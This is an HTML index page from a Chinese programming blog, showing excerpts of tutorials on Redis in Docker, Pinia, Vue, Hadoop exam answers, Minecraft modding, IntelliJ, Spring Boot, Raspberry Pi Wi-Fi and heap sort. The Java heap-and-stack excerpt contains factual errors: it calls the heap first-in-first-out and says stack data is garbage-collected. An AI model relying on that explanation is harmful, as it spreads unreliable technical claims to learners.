<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07ce64afdbdf266a1bdc88ca02973424/" rel="bookmark">
			Docker中安装reids
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Docker中安装reids 1、在home下创建目录sport cd /home mkdir sport //sport为我的项目名 然后在sport目录下创建文件夹redis和mysql，用于存放镜像
cd sport mkdir mysql mkdir redis 2、进入redis目录，拉取redis镜像 docker pull redis 等同于：
docker pull redis:latest 也可以指定redis版本进行安装
docker pull redis:版本号 此处演示拉取redis 5.0的版本：
3、查看redis镜像 docker images 4、启动docker docker run -p 6612:6379 \ --name redis \ -v /home/sport/redis:/data \ -d redis:5.0 redis-server --appendonly yes \ -- requirepass "Aa123456" requirepass “Aa123456”：启动redis的密码。
–name redis：启动容器的名字。
-d：后台运行。
-p 6612:6379：将容器的6379端口（后面那个6379，且redis必须是6379）映射到主机的6612端口（前面那个，鉴于暴露6379服务器容易中木马病毒，因此主机映射ip更改，减少被攻击的可能性）。
-d redis:5.0：启动哪个版本的redis。
启动成功：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91330132495f2baacd7cfc2bb6e2ee3a/" rel="bookmark">
			【总结】1654- 从入门到精通：深度解析 Pinia！（详细教程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		哈喽,大家好 我是 xy👨🏻‍💻。今天给大家分享最全面的 Pinia 保姆级教程。
Vue3 已经推出很长时间了，它周边的生态也是越来越完善了。之前我们使用 Vue2 的时候，Vuex 可以说是必备的，它作为一个状态管理工具，给我们带来了极大的方便。Vue3 推出后，虽然相对于 Vue2 很多东西都变了，但是核心的东西还是没有变的，比如说状态管理、路由等等。在 Vue3 中，尤大神推荐我们使用 pinia 来实现状态管理，他也说 pinia 就是 Vuex 的新版本。
那么 pinia 究竟是何方神圣，本篇文章带大家一起学透它！
1.pinia 是什么？ 如果你学过 Vue2，那么你一定使用过 Vuex。我们都知道 Vuex 在 Vue2 中主要充当状态管理的角色，所谓状态管理，简单来说就是一个存储数据的地方，存放在 Vuex 中的数据在各个组件中都能访问到，它是 Vue 生态中重要的组成部分。既然 Vuex 那么重要，那么在 Vue3 中岂能丢弃！在 Vue3 中，可以使用传统的 Vuex 来实现状态管理，也可以使用最新的 pinia 来实现状态管理，我们来看看官网如何解释 pinia 的。
「官网解释：」
Pinia 是 Vue 的存储库，它允许您跨组件/页面共享状态。
从上面官网的解释不难看出，pinia 和 Vuex 的作用是一样的，它也充当的是一个存储数据的作用，存储在 pinia 的数据允许我们在各个组件中使用。实际上，pinia 就是 Vuex 的升级版，官网也说过，为了尊重原作者，所以取名 pinia，而没有取名 Vuex，所以大家可以直接将 pinia 比作为 Vue3 的 Vuex。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91330132495f2baacd7cfc2bb6e2ee3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e16822e147cd4e7455abb45e65a1508d/" rel="bookmark">
			手把手教你——Vue怎么弄一个完美的置顶按钮（监测scroll到一定位置出现，点击置顶有动画）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、按钮基本样式 html代码
&lt;button class="top" @click="toTop" v-if="top"&gt; ^ Top &lt;/button&gt; css代码
.top { position: fixed; width: 33px; height: 33px; bottom: 50px; right: 20px; text-align: center; font-size: 12px; } 二、script方法 script代码
// 滚动监听 mounted () { window.addEventListener('scroll', this.handleScroll) // 监听页面滚动 }， methods：{ // 获取页面滚动距离 handleScroll () { let scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop if (scrollTop &gt; 200) { this.top = true; } else { this.top = false; } }， //回到顶部 toTop() { let Top = window.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e16822e147cd4e7455abb45e65a1508d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96c8c81cdb210f28f8a1489ae9e14b5b/" rel="bookmark">
			林子雨试卷《大数据技术原理与应用》试题与答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《大数据技术原理与应用》试题与答案
问答题（100分）：
（问答题，共13道题目，第1题4分，第2题6分，第3题10分，第4题10分，第5题16分，第6题6分，第7题12分，第8题6分，第9题6分，第10题8分，第11题4分，第12题6分，第13题6分）
1.(4%)请阐述大数据、云计算和物联网三者之间的关系。
答案：
近几年来，云计算受到学术界和工业界的热捧，随后，大数据横空出世，更是炙手可热。那么，大数据和云计算之间是什么关系呢？
（1）从整体上看，大数据与云计算是相辅相成的
大数据着眼于“数据”，关注实际业务，提供数据采集分析挖掘，看重的是信息积淀，即数据存储能力。云计算着眼于“计算”，关注 IT 解决方案，提供 IT 基础架构，看重的是计算能力，即数据处理能力。没有大数据的信息积淀，则云计算的计算能力再强大，也难以找到用武之地；没有云计算的处理能力，则大数据的信息积淀再丰富，也终究只是镜花水月。
（2）从技术上看，大数据根植于云计算
云计算关键技术中的海量数据存储技术、海量数据管理技术、MapReduce编程模型，都是大数据技术的基础。
（3）物联网借助于云计算存储数据，借助于大数据技术分析数据。
2.(6%)下图是Hadoop生态系统图，请分别阐述Hadoop生态系统的各个组成部分（Avro、Zookeeper、HDFS、HBase、MapReduce、Pig、Hive、Sqoop）的主要功能。
答案：
Avro是用于数据序列化的系统。它提供了丰富的数据结构类型、快速可压缩的二进制数据格式、存储持久性数据的文件集、远程调用RPC的功能和简单的动态语言集成功能。HDFS是一种分布式文件系统，运行于大型商用机集群，HDFS为HBase提供了高可靠性的底层存储支持。HBase位于结构化存储层，是一个分布式的列存储数据库。Mapreduce是一种编程模型，用于大规模数据集（大于1TB）的并行运算。Zookeeper是一个分布式的、高可用性的协调服务，提供分布式锁之类的基本服务，用于构建分布式应用，为HBase提供了稳定服务和失败恢复机制。Hive最早是由Facebook设计的，是一个建立在Hadoop基础之上的数据仓库，它提供了一些对存储在Hadoop文件中的数据集进行数据整理、特殊查询和分析的工具。Pig是一种数据流语言和运行环境，用以检索非常大的数据集，大大简化了Hadoop常见的工作任务。Sqoop为HBase提供了方便的RDBMS数据导入功能，使得传统数据库数据向HBase中迁移变得非常方便。 3. （10%）
（1）请论述HDFS1.0中SecondaryNameNode的作用和工作原理；（6%）
（2）请阐述HDFS的名称节点中关于数据块到数据节点的映射信息是如何维护的？（2%）
（3）HDFS HA解决了HDFS1.0中的什么问题？（2%）
答案：
（1）作用是减少Editlog大小，缩短名称节点重启时间。
SecondaryNameNode的工作情况： （1）SecondaryNameNode会定期和NameNode通信，请求其停止使用EditLog文件，暂时将新的写操作写到一个新的文件edit.new上来，这个操作是瞬间完成，上层写日志的函数完全感觉不到差别；
（2）SecondaryNameNode通过HTTP GET方式从NameNode上获取到FsImage和EditLog文件，并下载到本地的相应目录下；
（3）SecondaryNameNode将下载下来的FsImage载入到内存，然后一条一条地执行EditLog文件中的各项更新操作，使得内存中的FsImage保持最新；这个过程就是EditLog和FsImage文件合并；
（4）SecondaryNameNode执行完（3）操作之后，会通过post方式将新的FsImage文件发送到NameNode节点上
（5）NameNode将从SecondaryNameNode接收到的新的FsImage替换旧的FsImage文件，同时将edit.new替换EditLog文件，通过这个过程EditLog就变小了
（2）
请阐述HDFS的名称节点中关于数据块到数据节点的映射信息，是由数据节点不断向名称节点发送心跳信息来维护的，数据节点把自己维护的数据块列表发送给名称节点，名称节点根据各个数据节点汇报结果生成映射信息。
（3）HDFS HA解决了HDFS1.0中的单点故障问题。
4.(10%) 在MapReduce作业中，combine操作是可选的：
（1）请指出combine操作的作用；（2分）
（2）请指出combine操作在哪些场景下才能使用？（2分）
（3）请指出在MapReduce作业的Shuffle过程中，哪些环节可以使用combine操作？（6分）
答案：
（1）Combiner是可选择的，它的主要作用是在每一个Map执行完分析以后，在本地优先做Reduce的工作，减少在Reduce过程中的数据传输量。
（2）Combiner会优化MapReduce的中间结果，所以它在整个模型中会多次使用。那么，哪些场景才能使用Combiner呢？从这里分析，Combiner的输出是Reducer的输入，Combiner绝不能改变最终的计算结果。所以，一般而言，Combiner只应该用于那种Reduce的输入key/value与输出key/value类型完全一致、且不影响最终结果的场景，比如累加、最大值等。Combiner的使用一定得慎重，如果用好，它对job执行效率有帮助，反之，则会影响reduce的最终结果。
（3）
第一个使用combine的地方：在map作业执行过程中，每个map task都有一个内存缓冲区，存储着map的输出结果，当缓冲区快满的时候，需要将缓冲区的数据以一个临时文件的方式存放到磁盘，如果client设置过Combiner，那么现在就是使用Combiner的时候了。将有相同key的key/value对的value加起来，减少溢写到磁盘的数据量。
第二个使用combine的地方：每次溢写会在磁盘上生成一个溢写文件，如果map的输出结果真的很大，有多次这样的溢写发生，磁盘上相应的就会有多个溢写文件存在。当map task真正完成时，内存缓冲区中的数据也全部溢写到磁盘中形成一个溢写文件。因为最终的文件只允许有一个，所以需要将这些溢写文件归并到一起，这个过程就叫做Merge。因为merge是将多个溢写文件合并到一个文件，所以可能也有相同的key存在，在这个过程中如果client设置过Combiner，也会使用Combiner来合并相同的key。
第三个使用combine的地方：在Reduce作业执行时，Reduce进程启动一些数据复制线程(Fetcher)，通过HTTP方式请求map task所在的TaskTracker获取map task的输出文件。复制过来的数据会先放入内存缓冲区中，当内存中的数据量到达一定阈值，就启动内存到磁盘的merge。与map 端类似，这也是溢写的过程，这个过程中如果你设置有Combiner，也是会启用的，然后在磁盘中生成了众多的溢写文件。
5.(16%)（1）请阐述HBase三层结构；（6分）
（2）请阐述在HBase三层结构下，客户端是如何访问到数据的？（2分）
（3）在HBase中，每个HRegion Server维护一个HLog，而不是每个HRegion一个。请说明这种做法的优点和缺点。（3分）
（4）当一台HRegionServer意外终止时，主服务器HMaster如何发现这种意外终止情况？为了恢复这台发生意外的HRegionServer上的HRegion，HMaster应该做出哪些处理（包括如何使用HLog进行恢复）？（5分）
答案：
（1）HBase使用类似B+树的三层结构来保存HRegion位置信息：
第一层是Zookeeper文件：它记录了-ROOT-表的位置信息，即root region的位置信息；第二层是-ROOT-表：只包含一个root region，记录了.META.表中的region信息。通过root region，我们就可以访问.META.表的数据。第三层是.META.表：是一个特殊的表，记录了用户表的HRegion信息，.META.表可以有多个HRegion，保存了HBase中所有数据表的HRegion位置信息。 图7-7 HBase的三层结构
（2）Client访问用户数据之前，需要首先访问Zookeeper，然后访问-ROOT-表，接着访问.META.表，最后才能找到用户数据的位置去访问，中间需要多次网络操作，不过client端会做cache缓存。
（3）每个HRegion Server维护一个HLog，而不是每个HRegion一个。这样不同HRegion(来自不同表)的日志会混在一起，这样做的目的是，不断追加单个文件相对于同时写多个文件而言，可以减少磁盘寻址次数，因此，可以提高对表的写性能。带来的麻烦是，如果一台HRegionServer下线，为了恢复其上的HRegion，需要将HRegionServer上的HLog进行拆分，然后分发到其它HRegionServer上进行恢复。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96c8c81cdb210f28f8a1489ae9e14b5b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20de9c63612b807e8c320c4cea6ec941/" rel="bookmark">
			节外生枝 - Minecraft Fabric Mod 开发：第 1 期 开发环境与准备
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 各位如果有玩过Minecraft这款游戏的话，想必一定会体验过很多Mod，有的玩法新奇，有的贴近真实。那么各位方块人有没有想过开发自己的Mod呢？本系列就会为大家揭开Mod开发的谜题。
准备 安装好JetBrains IntelliJ IDEA安装好Java SE Development Kit 8 具体操作 一、安装插件 打开IntelliJ，点击Plugins，在Marketplace下搜索Minecraft Development，点击下载安装。（若有重启要求则先重启IDEA
二、创建项目 选择Projects，新建项目New Project，选择Fabric，选择好版本，设置好项目名等。
其中，"Create Git repository"可不选，这里是为了方便给大家参考，本项目源代码将上传到GitHub。同时"Use Mixins"也可不选，但建议选上。
三、构建项目 进入项目以后，IDEA会自动为你构建。在这段过错中，IDEA会为您下载好Minecraft原版、Fabric，以及一些库和开发工具。如果没有自动构建，可以找到菜单手动进行构建Build-&gt;Build Project。
当你的IDEA启动任务列表中出现了Minecraft Client和Minecraft Server，并且项目中src文件夹下main文件夹图标已变为Fabric图标时，可以算是准备完成。接下来就可以进行具体代码实现了。
最后，就祝大家学习愉快！编写出自己的Mod，创造出自己梦想的Minecraft的世界！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97861770c4923c49b4e82451901af70e/" rel="bookmark">
			IntelliJ IDEA安装及配置JDK.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 下载IntelliJ IDEA安装包 IntelliJ IDEA是目前主流的Java开发工具之一，甚至许多企业在招聘启示中明确要求开发人员掌握IntelliJ IDEA的使用！可以打开浏览器搜索intellij idea关键字，在搜索结果中找到其官方网站https://www.jetbrains.com/idea/并点击进入： 点击主页的DOWNLOAD按钮以打开下载页面：
在下载页面中，可以看到IntelliJ IDEA有Ultimate企业版（终极版）和Community社区版，如果需要开发Java企业级应用，需要下载Ultimate版，该版本是付费使用软件，有30天的免费试用时间。
直接下载的是最新版本，如需下载早期其它版本，点击左侧的Other Versions链接：
选择所需要的安装文件下载即可：
2. 开始安装IntelliJ IDEA
找到下载的安装包文件并执行，即可打开安装向导，在第1个界面直接点击Next即可：
在选择安装路径的界面，可以自行确定IntelliJ IDEA的安装目录，并点击Next到下一步：
关于安装选项主要有：
Create Desktop Shorcut：创建桌面快捷方式，可勾选中64-bit launcher，则安装完成后，会在桌面生成启动IntelliJ IDEA的快捷方式；Update PATH variable：更新PATH环境变量，如果勾选中该选项，则IntelliJ IDEA的安装目录会被配置到系统的PATH环境变量中，主要表现为在命令提示符窗口中，在任何位置都可以直接启动IntelliJ IDEA，其实具体作用并不明显，可以自由勾选；Update context menu：更新上下文菜单（右键菜单）；Create Associations：创建文件类型关联，如果勾选对应的扩展名，则以后双击对应类型的文件时，会使用IntelliJ IDEA打开这些文件；Download and install 32-bit JetBrains Runtime：下载并安装应用于32位操作系统的JetBrains运行环境。 确认了安装选项后，继续点击Next到下一步：
关于开始菜单的文件夹，保持默认即可：
然后，等待安装完成即可：
3. 准备使用IntellJ IDEA 双击桌面的IntelliJ IDEA快捷方式，即可启动IntelliJ IDEA，第1次运行时，会打开一些设置界面，首先是使用的许可协议，直接勾选表示“同意许可协议”即可：
在Data Sharing界面，表示IntelliJ IDEA希望使用者能分享一些数据帮助其进行改进，且明确的表示了分享的数据将不包括个人信息及任何敏感数据，例如源代码、文件等。
点击Don't Send表示不会向IntelliJ IDEA分享任何数据，点击Send Anonymous Statistics表示将匿名发送，可根据自已实际情况进行选择：
IntelliJ IDEA的默认主题风格有Darcula的暗色风格和Light的亮色风格，可根据自己喜好进行选择：
IntelliJ IDEA默认就已经安装了许多插件，使得开发人员可以更快捷的进行开发，当前Default plugins界面显示的是已经安装的插件，可以点击对应的Customize自行定制，或点击对应的Disable All将其全部禁用，由于该界面中显示的插件大多是常规使用插件，且使用频率可能较高，如果尚且不了解各插件的作用，建议不作任何修改，直接点击右下角的Next: Featured plugins到下一步：
在Download featured plugins界面显示的是高级插件，默认并没有安装，如果需要，可以点击对应的Install按钮，将下载并安装，如果尚且不了解各插件的作用，可以暂不安装（如果以后有使用需求，也可以在设置界面中安装），直接点击右下角的Start using IntelliJ IDEA以开始使用：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97861770c4923c49b4e82451901af70e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/806f1c88aa4d01e5919d02677790cf51/" rel="bookmark">
			spring boot3.0新特性Http客户端远程调用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装依赖
&lt;!-- For reactive support --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt; &lt;/dependency&gt; 2、项目结构
3、新建配置类WebConfig
package com.example.springboot3.config; import com.example.springboot3.client.UserClient; import com.fasterxml.jackson.databind.ObjectMapper; import lombok.SneakyThrows; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.reactive.function.client.WebClient; import org.springframework.web.reactive.function.client.support.WebClientAdapter; import org.springframework.web.service.invoker.HttpServiceProxyFactory; @Configuration public class WebConfig { // @Bean // WebClient webClient(ObjectMapper objectMapper) { // return WebClient.builder() // .baseUrl("http://localhost:8001") // .build(); // } @Bean WebClient webClient() { return WebClient.builder() .baseUrl("http://localhost:8001") .build(); } @SneakyThrows @Bean UserClient postClient(WebClient webClient) { HttpServiceProxyFactory httpServiceProxyFactory = HttpServiceProxyFactory.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/806f1c88aa4d01e5919d02677790cf51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9f3512f8d22423fe11fef47dab35b0d/" rel="bookmark">
			树莓派在Ubuntu下WiFI网络图形化界面显示无WIFI问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在安装好ubuntu server系统以后，一开始下载了xubuntu-desktop桌面，打开WIFI界面，显示没有网络适配器，在CSDN上找了一大堆其他博客，包括ifconfig，查看wlan0,使用raspi-config进行设置，等等，但是始终没有作用。以为是桌面的问题，遂光速卸载xbuntu，安装ubuntu-desktop，但是依然换汤不换药。
界面仍然没有WIFI
找了很久，发现问题出在最开始安装ubuntu-server的时候，当时为了在命令行的时候可以用SSH，提前在network.config里面对WIFI进行配置，就像这种
但是在初步配置完成，SSH完成基本操作后，树莓派的设置中WIFI那里会显示没有WIFI配置，这是因为在配置后会将这个功能取消掉，需要去改回来。
#输入如下命令 cd /etc/netplan/ #输入ls,会发现有这个文件 50-cloud-init.yaml sudo vim 50-cloud-init.yaml 出现如下页面 # This file is generated from information provided by the datasource. Changes # to it will not persist across an instance reboot. To disable cloud-init's # network configuration capabilities, write a file # /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following: network: {config:disabled} network: version: 2 wifis: renderer: networkd wlan0: access-points: opoo for test: password: 7a5fb286602b87d053d41beb30c525309265f03509c5952ab5e79e9d44156d86 dhcp4: true optional: true ~ ~ ~ 其中 opoo for test是我预先配置好的wifi,但是你可以发现，上面有行代码是这样子的 network: {config:disabled} 这就是导致我们看不到其他WIFI的罪魁祸首，我在这里先把自己配置好的WIFI注释掉，然后将其改为able network: {config:able} #network: # version: 2 # wifis: # renderer: networkd # wlan0: # access-points: # opoo for test: # password: 7a5fb286602b87d053d41beb30c525309265f03509c5952ab5e79e9d44156d86 # dhcp4: true # optional: true wq保存出来，你就会泪流满面，发现自己的WIFI界面终于出来了
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9f3512f8d22423fe11fef47dab35b0d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d07c4e80ea9a9311ab9a4b53c8ddebb/" rel="bookmark">
			JAVA中的堆和栈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在JAVA的内存空间中，存在重要的两个内容便是JAVA的堆和栈，两者都用来存放数据，但又有所区别。
当你用各种工具使用java语言编写了一段程序，当这段程序被运行的时候，在java中的内存会有五块区域进行数据的存储，分别为程序计数器，本地方法区，方法区，堆，栈。
1.堆
就相当于当你new一个对象的时候，就会分配一个堆内存给你，当对象销毁时就会有垃圾回收机制来回收这个对象的堆空间。
2.栈
就好比一串珠子，你只能从一头加或者取，要取后面的就要把前面的取出来才可以。
3.堆内存
作用就是用来存放java中的对象和数组，当new一个对象或者new一个数组的时候就会在堆内存中开辟一个空间给它。用于存放。
特点：第一个就是先进先出，后进后出，类似于一串珠子，一头来放，一头来出，先放进去的珠子可以先出来，后放进去的珠子要等前面的珠子出来以后才能进去。
堆中的数据都具用默认的初始值。
第二个 堆可以动态的分配内存大小，生存期事先不必告诉编译器，因为他是在运行的时候动态的分配内存，创建的对象当不再被指向时，将会被回收内存，内存回收需要通过jvm的自动垃圾回收器来管理，而C语言需要手动的清楚，这是java优于c的表现之一。
4.栈内存
存在与java中的另一种内存，主要用来执行程序用的，比如基本类型的变量和对象的引用变量。
它是由许多栈帧组成，而每个栈帧又包括了局部变量表、操作数栈、动态链接以及方法出口信息。每次方法调用都会将对应的栈帧压入虚拟机栈，当方法调用结束(方法调用return或者方法抛出异常)又会将该栈帧从虚拟机栈中弹出。由于栈的特性(FILO 先进后出，后进先出)，每次操作的都是栈顶栈帧，又被称为“当前活动栈帧”，代表当前正在执行的方法。在JVM执行引擎运行时，所有指令都针对于当前活动栈帧进行操作。
特点：”先进后出，后进先出
栈的生存空间需要提前声明，而栈中数据的生存空间存在于{}大括号内，也就解释了为什么定义方法或者主函数的时候先要把方法体括起来。
栈中的数据都没有初始值，需要手动的赋予。
存取速度比堆要快，仅次于寄存器。栈数据可以共享，主要表现为
Int a = 123, int b = 123。这里的a和b 指向的栈中的内存是一致的。
缺点：存在栈中的数据大小与生命期是确定的，缺乏灵活性。、
同样栈内存也需要通过jvm的自动垃圾回收器自动回收。
5.栈和堆的区别
Jvm是基于堆栈的虚拟机，每当一个线程创建，jvm就会为其分配一个堆栈，也就是程序的运行就是通过堆栈的操作来进行的，堆栈以帧为单位保存线程的状态，jvm对堆栈只进行两种操作，以帧为单位的压栈和出栈操作。
差异：堆用来存放new的对象或者数组
栈内存用来存放方法或者局部变量，所有的基本变量和引用类型也是。
栈是线程私有的而堆是线程共有的，也就是说不同的线程可以得到相同的对象。
堆中的数据即便与栈中的数据相同，也不会与栈中的数据共享。
在使用 String str = “abc” 时，他的操作原理是
首先会在栈中查找是否含有相同值的栈内存，如果没有则会开辟一个栈内存用来存在这个字符串的值，并且会生成一个地址，相当于每个人家里的门牌号，便于别人能够更快的找到你，接着会创建一个对象假设为A，A对象所包含的就是你的门牌号，也就是栈的地址，通过A对象就可以快速的访问这个地址中的信息。如果在定义这个变量的时候发现栈中存在相同的信息值，则会将A对象给str这个引用，调用str就会使用A对象，也就得到了其值“abc”，这就是栈的数据共享原理。
这里的str并不能完全的说我们创建了string对象，因为由于栈的数据共享性，你可能只是为A对象创建了一个新的引用。
而对于string str = new string（“abc”），则会一律在堆内存中开辟空间用来存放数据，单例模式就是为了解决这种浪费产生的方法。
另外每当定义的字符串改变时都会产生一个新的对象，这个时候应当使用stringBuffer类进行操作在原存储空间中改变值得大小，提高程序效率。
定义一个函数如图：在主函数中声明一个变量为x，将x作为值进入show方法，最后还是输出x的值为1.
原理如下图所示：
当声明一个int变量的时候，在java栈中会为其开辟一个内存空间用来存储X的引用值，当X作为初始值传入show函数的时候，1 的值引用多了一个b,这个时候b和X指向同一个值为1，当对b引用进行操作的时候，java栈便会开辟一个新的地址来存储新的值，并把这个地址交给b,这个时候X引用指向的值还是没有发生变化的。所以输出的值仍然是1.
再看另一种代码展示方式：该程序存在两个函数主函数main和自定义函数show。
这种程序的输出结果仍然是1.
分析该程序，当程序运行的时候JVM将会先执行main函数，因为他是程序的入口，运行主函数时，主函数中定义了一个变量X。这时在栈中便会开辟一个内存地址用来存储1这个值，并且将引用X指向该内存地址。
当运行到show函数时，同理，在函数中会开辟一个内存地址用来存储2这个值，引用X指向这个内存地址。
当show函数执行完毕，这个时候show函数在栈中的生命周期已经结束，其在栈中的内存空间被释放。如图所示。
对于数组的定义在堆栈中的操作
程序运行，jvm在栈内存中开辟空间用来存放array变量，同时在堆中也会开辟一段连续空间用来存储new int[3].同时会给栈一个地址，使得栈可以根据这个地址来找到堆中的数组信息。这时的array变量便是指向堆中的数组信息，
而后第二步对数组中的数据进行赋值，即通过array这个引用找到数组的数据，然后对相应的空间进行数值的赋予，如果不给数组赋值的话，默认int数组的默认值为0；原理图如下
这时再添加一条代码array= null；就会将栈中的引用array清楚，这个时候在堆中的数组数据没有指向的时候就会被JVM的自动垃圾回收装置清除。
再定义一个新的数组array1
这个时候的堆栈图如下图所示：
在这个时候，在栈中定义了新的变量array1，然后将变量array的内存地址分配给array1，所以这个时候array1也将指向array定义的数组，并且根据array1引用来修改数组，array引用指向的数组也会发生变化。这时的输出为20。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d07c4e80ea9a9311ab9a4b53c8ddebb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8bff2c9b291f3305554cedefc5a1d08/" rel="bookmark">
			堆排序（简单易懂，适合初学者）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是堆 堆是一种特殊的树形结构，叫做完全二叉树。它有两种类型：大顶堆和小顶堆。在大顶堆中，每个父节点都比它的子节点大；而在小顶堆中，每个父节点都比它的子节点小。堆排序就是利用这种结构设计的一种排序方法。
堆的分类 大顶堆:对于每一个节点来说，它的值都大于他的左孩子的值和右孩子节点的值。
小顶堆：对于每一个节点来说，它的值都小于他的左孩子的值和右孩子节点的值。
如果将以上两种堆变成数组，如下图所示:
大顶堆：
小顶堆
排序思想 首先，把要排序的数组变成一个大顶堆，这样最大的数就在堆的顶部。
接着，把堆顶的数和数组的最后一个数交换。现在，最大的数已经在数组的末尾，剩下的数组元素个数变为 n-1。
对剩下的 n-1 个数再次构建大顶堆，然后把新堆顶的数和 n-1 位置的数交换。不断重复这个过程，直到得到一个升序排列的数组。
注意：要得到升序排列的数组，用大顶堆；要得到降序排列的数组，用小顶堆（默认情况下，我们使用升序排序）。
如何构造堆 首先我们给定一个无序的序列，将其看做一个堆结构，一个没有规则的二叉树，将序列里的值按照从上往下，从左到右依次填充到二叉树中。
在一个完全二叉树中，当所有非叶子节点都有两个子节点时，每一层的节点数是上一层的两倍。根节点有1个，所以最后一层的节点数等于之前所有层节点总数加1。因此，我们可以找到最后一层的第一个节点的索引，即节点总数除以2（根节点索引为0）。这就是第一个叶子节点的索引。那么第一个非叶子节点的索引就是最后一个叶子节点的索引减1。
对于不完全填满的二叉树，这种计算方法仍然适用。当我们按照从上到下、从左到右的顺序填充二叉树时，第一个叶子节点的索引一定是序列长度除以2。所以，最后一个非叶子节点的索引是 arr.len / 2 - 1。例如，对于数组长度为5的情况，最后一个非叶子节点的索引为 5 / 2 - 1 = 1，即节点值为 6 的节点。
那么如何构建大顶堆呢？我们找到了最后一个非叶子节点，即节点值为 6 的节点。我们需要比较它的左右子节点中值最大的那个，如果这个最大值比当前节点大，就交换它们的位置。
在这个例子中，节点值为 6 的节点有两个子节点，分别为 5 和 9。9 大于 6，所以我们交换 6 和 9 的位置。这样，我们就在局部构建了一个大顶堆。
找到下一个非叶子节点4，用它和它的左右子节点进行比较，4大于3，而4小于9，交换4和9位置
此时发现4小于5和6这两个子节点，我们需要进行调整，左右节点5和6中，6大于5且6大于父节点4，因此交换4和6的位置
现在我们已经构建了一个大顶堆，接下来进行排序。
首先，将堆顶元素（假设为9）与数组末尾元素（假设为4）交换位置。此时，数组末尾的数字是最大值。然后，排除已经确定的最大元素，将剩下的元素重新构建成一个大顶堆。
以下是第一次交换的示意图：
以下是第二次交换的示意图
最终的排序结果为：
由此，我们可以归纳出堆排序算法的步骤：
将无序数组构建成一个大顶堆（或小顶堆，取决于所需排序顺序）。
循环地将堆顶元素移动到数组尾部，并调整堆结构，生成新的堆顶。
当我们将一个最大堆的堆顶元素移动到数组末尾（实际上是交换堆顶和末尾元素的位置），堆会自我调整，使得次大的元素成为新的堆顶。
就像前面的例子，当我们移走值为9的堆顶元素后，堆会调整使值为6的元素成为新的堆顶；当我们再次移走值为6的堆顶元素，堆会调整使值为5的元素成为新的堆顶，以此类推。
由于二叉堆的这个特性，每次移动堆顶元素并调整堆结构后，新的堆顶都是仅次于前一个堆顶的元素。因此，我们只需要不断地移动堆顶元素并调整堆结构，最终得到的数组就会是一个有序数组。
示例代码： public class HeapSort { public static void main(String[] args) { int[] arr = {12, 11, 13, 5, 6, 7}; heapSort(arr); System.
	</div>
